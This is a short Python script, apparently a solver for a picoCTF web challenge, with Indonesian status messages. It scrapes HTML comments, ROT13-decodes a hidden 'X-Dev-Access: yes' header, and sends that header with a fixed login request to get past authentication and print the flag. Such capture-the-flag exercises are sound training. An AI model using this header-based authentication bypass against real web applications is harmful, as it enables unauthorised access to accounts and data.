import requests
import re
import sys
import codecs
import urllib3
from bs4 import BeautifulSoup, Comment
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def main():
    if len(sys.argv) != 2:
        print("masukkan url targer")
        sys.exit(1)

    url = sys.argv[1]
    s = requests.session()
    r = s.get(url, verify=False)
    if r.status_code == 200:
        #print("sudah masuk")
        soup = BeautifulSoup(r.text, 'html.parser')
        #print(soup.prettify())
        comments = soup.find_all(string=lambda text:isinstance(text, Comment))
        for c in comments:
            match = re.search(r'K-Qri-Npprff: lrf', c)
            if match:
                decode = codecs.decode(match.group(), 'rot_13')
                #print(decode)
                # Assuming decode is "X-Dev-Access: yes"
                header_key, header_value = decode.split(': ')
                headers = {header_key: header_value}
                #print(headers)
                
                # Fix data_login to be a dictionary or list of tuples
                data_login = {'email': 'ctf-player@picoctf.org', 'password': '123'}
                url_login = url.rstrip('/') + '/login'
                r = s.post(url_login, data=data_login, verify=False, headers=headers)
                res = r.text
                print(res[96:125])
    else:
        print("gagal ")

if __name__ == "__main__":
    main()
